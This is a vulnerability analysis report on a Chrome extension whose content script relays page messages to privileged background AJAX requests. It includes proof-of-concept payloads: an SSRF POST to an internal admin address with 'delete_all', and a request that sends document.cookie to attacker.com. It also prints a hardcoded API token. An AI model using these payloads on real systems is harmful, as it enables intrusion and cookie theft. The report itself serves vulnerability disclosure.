# CoCo Analysis: oakmebahenghclncfieaophafoieobbc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (jQuery_ajax_settings_url_sink and jQuery_ajax_settings_data_sink)

---

## Sink 1: cs_window_eventListener_message → jQuery_ajax_settings_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oakmebahenghclncfieaophafoieobbc/opgen_generated_files/cs_0.js
Line 467 (webpack bundled code - analyzed after third "// original" marker at line 465)

**Code:**

```javascript
// Content script (cs_0.js) - line 467 (minified, formatted for clarity)
window.addEventListener("message", (function(e) {
  "fetchHandle" == e.data.type && chrome.runtime.sendMessage(e.data, (function(e={}) {
    window.postMessage({type:"fetchHandleRes", key:e.key, res:e.res}, "*")
  }))
}), !1)

// Background script (bg.js) - line 965 (minified, formatted for clarity)
chrome.runtime.onMessage.addListener((function(e,n,r) {
  if("fetchHandle"==e.type) {
    var t=e.params; // ← attacker-controlled params
    e.token;
    return console.log("接收content-script请求==>",t),

    t.url.indexOf("i.snssdk.com")>0 && (t.params=Object.assign(t.params||{},{aid:"1350"})),

    jQuery.ajax({
      url:t.url, // ← attacker-controlled URL
      data:t.params, // ← attacker-controlled data
      type:t.method, // ← attacker-controlled method
      headers:{
        "x-tt-token":"00128140d5cee08061da889bebde3d4a4235b278650c027e8e02610eaa8b7d5076aeb0d2a35afe188010dcadd6b6ca195925",
        "sdk-version":2
      }
    }).then((function(e){
      console.log("请求成功",e,t),
      r({key:t.url,res:e})
    }),(function(e){
      console.log("请求失败",e),
      r({key:t.url,res:e})
    })),
    !0
  }
}))
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any webpage matching content_scripts in manifest.json:
// ["http://s3.bytecdn.cn/*", "https://s3.bytecdn.cn/*",
//  "https://hotsoon.snssdk.com/*", "http://hotsoon.snssdk.com/*",
//  "https://i.snssdk.com/*", "http://i.snssdk.com/*",
//  "https://ife.byted.org/*", "http://localhost:4000/*"]

// SSRF to internal network:
window.postMessage({
  type: "fetchHandle",
  params: {
    url: "http://192.168.1.1/admin",
    params: {action: "delete_all"},
    method: "POST"
  }
}, "*");

// Exfiltrate to attacker:
window.postMessage({
  type: "fetchHandle",
  params: {
    url: "http://attacker.com/collect",
    params: {stolen_data: document.cookie},
    method: "POST"
  }
}, "*");
```

**Impact:** Attacker can perform privileged cross-origin requests to arbitrary URLs with arbitrary data. The extension makes AJAX requests from background context (bypassing CORS), allowing SSRF attacks to internal networks, data exfiltration, and unauthorized API calls.

---

## Sink 2: cs_window_eventListener_message → jQuery_ajax_settings_data_sink

**CoCo Trace:**
Same flow as Sink 1 (different sink type but same vulnerability)

**Code:**
(Same as Sink 1)

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**
(Same as Sink 1)

**Impact:** Attacker controls the `data` parameter sent in the AJAX request, allowing injection of arbitrary request payload data.
